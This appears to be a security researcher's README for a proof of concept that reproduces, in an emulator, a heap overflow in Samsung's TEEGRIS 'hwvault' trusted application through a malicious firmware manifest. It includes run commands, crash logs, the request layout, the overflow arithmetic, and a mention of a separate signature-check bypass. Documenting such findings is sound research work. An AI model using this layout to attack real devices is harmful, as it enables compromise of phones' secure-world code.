# HvAUtW cmd 10036 — CRITICAL FW_NUM heap overflow, REPRODUCED IN-TA (SFDZE1)

This PoC drives **HV_TZ_CMD_SECNVM_UPDATE_FW_WITH_MANIFEST (cmd 10036)** of the
`hwvault` (HvAUtW) driver TA end-to-end over the emulator's `:1337` TEEC
protocol and triggers the finding-#4 controlled linear heap overflow inside
`swd_hv_strong_check_manifest_signature` (the malloc(304) record buffer overrun
driven by an attacker-controlled `FW_NUM`).

It targets the **shipping build S921BXXSFDZE1** (sha256 `f7245609a35c...`), staged
at `teegris/tas/hwvault_sfdze1/` — *not* the bundled `teegris/tas/<uuid>.ta`,
which is the older **S9BYH2** build where the entire cmd-10036 manifest feature
is code-absent (build delta; `grep -c FW_NUM` on S9BYH2 = 0).

## Run

```
# boot the SFDZE1 hwvault (additive corpus entry, does not clobber S9BYH2):
bash teegris/confirmations/emu_start_sfdze1.sh hvautw_sfdze1_repro --tee teegris
# drive cmd 10036 with the malicious manifest:
bash teegris/confirmations/emu_poc.sh teegris/pocs/hvautw_manifest_sfdze1/jni poc.c
# read the asan signal:
grep -A40 'memory corruption detected' teegris/confirmations/_logs/hvautw_sfdze1_repro.log
```

## What the emulator shows (the reproduction)

```
hwvault [INF] (swd_secnvm_update_fw_with_manifest:139) start ...
hwvault [INF] (swd_secnvm_update_fw_with_manifest:173) received frag type=0, total_size=1283, fw_len=1283, start_pos=0
hwvault [INF] (swd_hv_strong_check_manifest:138) swd_hv_strong_check_manifest started
OPENSSL_malloc: allocated 0x130 at 0xaaab5020      <-- the fixed 304-byte record buffer
redzone hook 0xaaab5150                             <-- asan redzone immediately after it (0x5020+0x130)
strstr b'{"K250_VERSION":"1","FW_NUM":"8","FW_IMAGE_LIST":[ ... HASH":"4141.."} ...'
=================[lr: 0x55555556d088] [strchr] memory corruption detected!!
 ... x20 : 0xaaab5024   (v5, the record-buffer base: per-image dest = v5 + 60*i)
 ... x21 : 0xaaab6020   (the adjacent malloc(216) SHA384_CTX chunk)
 ... pc  : 0xdeadbeef   (asan CRASH_PC sentinel — the OOB access was trapped)
unicorn ... UcError: Invalid memory fetch (UC_ERR_FETCH_UNMAPPED)
```

The asan redzone planted right after the 304-byte `OPENSSL_malloc` chunk fires
inside the manifest parse loop while it is hex-decoding HASH bytes into
`v5 + 60*i + 24`. With `FW_NUM=8` and eight 96-hex (48-byte) HASHes, image
`i=4` already writes at `24 + 60*4 = 264 .. 312` — past the 304-byte chunk — so
the write lands in the redzone and asan traps it (`pc=CRASH_PC=0xdeadbeef`).
This is the controlled linear heap overflow of RE finding #4, fired in pure
parsing, *before* (and independent of) the bypassed ECDSA verify (finding #1).

## The cmd-10036 request layout (RE-derived from THIS binary)

* `TA_InvokeCommandEntryPoint @0xA628`: `cmp w2,#0x65` → param_types must be
  `0x65 = TEE_PARAM_TYPES(MEMREF_INPUT, MEMREF_INOUT, NONE, NONE)`; both memrefs
  must be REE shared memory; then tail-calls `tz_process_command @0xFD7C`.
* Envelope: `[u32 cmd_id=10036][u32 payload_len L][TLV items]`, `L = total-8`.
  TLV item = `[u32 tag][u32 len][len bytes]` (bytes, tag hi byte `0x02`) or
  `[u32 tag][u32 value]` (scalar, tag hi byte `0x01`).
* `hv_secnvm_update_fw_with_manifest @0x10B0C` requires **six** items:
  scalars `0x010000D6`, `0x010000D7` (body_size), `0x010000D8` (start_pos, must
  be `< manifest_len`), `0x010000DE` (transfer_unit_size); bytes `0x020000DC`
  (signed-data blob) and **`0x020000DD` = the JSON manifest** that
  `swd_hv_strong_check_manifest_signature @0x17B5C` parses (verified by probing
  the function entry: it parses its *second* bytes arg, `[x23+8]`).
* Manifest JSON grammar (parser @0x17C58, keys in order):
  `{"K250_VERSION":"..","FW_NUM":"<count>","FW_IMAGE_LIST":[`
  `{"IMAGE_TYPE":"..","IMAGE_VERSION":"..","HASH":"<=96 hex>"}, ...]}`.

See `RE/emulation/hvautw_sfdze1_attempt.md` (ta-analysis repo) for the full
write-up, and `RE/samsung_teegris/hvautw.md` finding #4 for the static origin.
